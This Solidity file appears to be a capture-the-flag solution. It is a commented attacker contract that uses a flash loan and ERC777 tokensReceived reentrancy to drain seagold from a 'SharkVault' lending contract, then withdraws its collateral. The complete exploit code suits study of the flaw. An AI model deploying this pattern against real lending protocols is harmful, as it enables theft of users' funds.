// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Here we can find the standard interface for the ERC20. Don't forget that we find
// out that the seagold is actually an ERC777 token !
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// This is the registry that tells for a given contract which interface its supports
// There is a getter and a setter.
// The manager of a contrat is the contract itself by default.
interface ERC1820Registry {
	function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address);
  function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

// This is the vault we are going to attack
interface SharkVault {
    // The Shark charges predatory interest rates...
    function INTEREST_RATE_PERCENT() external returns(uint256);

    function gold() external returns(address);
    function seagold() external returns(address);

    struct LoanAccount {
        uint256 depositedGold;
        uint256 borrowedSeagold;
        uint256 lastBlock;
    }
    function depositGold(uint256 _amount) external ;
    function withdrawGold(uint256 _amount) external payable;
    function borrow(uint256 _amount) external;
    function repay(uint256 _amount) external;
    function liquidate(address _borrower) external;
    function updatedAccount(
        address _accountOwner
    ) external view returns (LoanAccount memory account);
}

// This is one of the interface of our attacker contract.
// onFlashLoan will be called by the FlashLender (see the next interface)
// when this function is called we actually have the gold token in the 
// attacker contract
interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

// This one is the interface for the flash loan borrower.
// This is where we find the initial golds that will boostrap the whole attack
// and the ones that we have to repay at the end of the flashloan (+ fee) but there
// is no fees in this scenario.
interface IERC3156FlashLender {

    function maxFlashLoan(
        address token
    ) external view returns (uint256);

    function flashFee(
        address token,
        uint256 amount
    ) external view returns (uint256);

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

// This is the second interface that our FlashLoan contract implement
// It is basically where the re-entrancy attack begins !
interface IERC777TokensRecipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}


// And there it is ! The FlashLoan attacker contract wich implements the whole
// attack logic
contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {

    IERC20 gold;
    IERC20 seagold;
    IERC3156FlashLender flashLender;
    SharkVault vault;
    bool pwned;
    ERC1820Registry registry;

		// First, we get all the utilities we will need to access during the attack
    constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) {
      gold = IERC20(_gold);
      seagold = IERC20(_seagold);
      flashLender = IERC3156FlashLender(_flashLender);
      vault = SharkVault(_vault);
      registry = ERC1820Registry(_registry);
    }

		// The attack is in two phases:
		// - 1) State that the contract implement the interface for the tokenReceived method
		//      in the ERC1820 registry
	  // - 2) Launch the actual attack starting with the flashloan on the Flash Lender contract
    function attack() public {
      registry.setInterfaceImplementer(address(0), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this));
      uint maxAmount = flashLender.maxFlashLoan(address(gold));
      flashLender.flashLoan(this, address(gold), maxAmount, abi.encode(0));
    }

		// Once the loan is authorized by the Flash Lender it calls this function
    // on the our flash loan attacker contract
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata 
    ) public returns (bytes32) {
			// Those are almost useless check
      require(initiator == address(this), 'Wrong initiator');
      require(token == address(gold), 'Not gold');
      require(fee == 0, 'Fee must be 0');

			// First we deposit the gold token into the vault as collateral
      require(gold.approve(address(vault), amount));
      vault.depositGold(amount);
			
			// Then we borrow some seagold
			// if everyting is fine the function to be called is tokenReceived down
			// bellow
			// The first borrow is intentionally of 0 since when we are going to 
			// depop from the stack it's going to be the last value... So we'll
			// have nothing to repay in order to leave the shark vault :)
      vault.borrow(0 ether);
			
			// This is called only once the recursion is over
			// And it correspond to the withdrawing of the collateral from the 
			// shark vault
      vault.withdrawGold(amount);
			
			// Finally we can approve the gold transfer in order to repay the initial
			// loan made to the Flash Lender !
      require(gold.approve(address(flashLender), amount));
			// And don't forget to return the expected hash:
      return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function tokensReceived(
      address,
      address,
      address,
      uint256 ,
      bytes calldata,
      bytes calldata
    ) external {
      uint amount = seagold.balanceOf(address(vault));
			// classic recursion pattern to prevent infinte loop
      if (amount == 0) {
        return;
      }
			// since there is 1000 ether of collateral 750 is the max amount we can borrow
      vault.borrow(750 ether);
    }

}